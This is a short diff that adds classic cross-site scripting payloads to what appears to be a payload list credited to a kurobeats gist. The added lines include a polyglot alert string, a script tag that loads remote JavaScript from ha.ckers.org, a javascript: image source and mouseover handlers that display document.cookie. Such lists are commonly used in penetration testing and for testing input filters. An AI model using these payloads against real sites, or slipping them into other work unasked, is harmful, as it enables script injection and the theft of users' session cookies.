@@ -1,3 +1,14 @@
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a> 
+
+Anything below this is thanks to kurobeats
 Source: https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
 I did not create this kurobeats is an awesome person for having dumped this in his gist permission was given to use this.
 
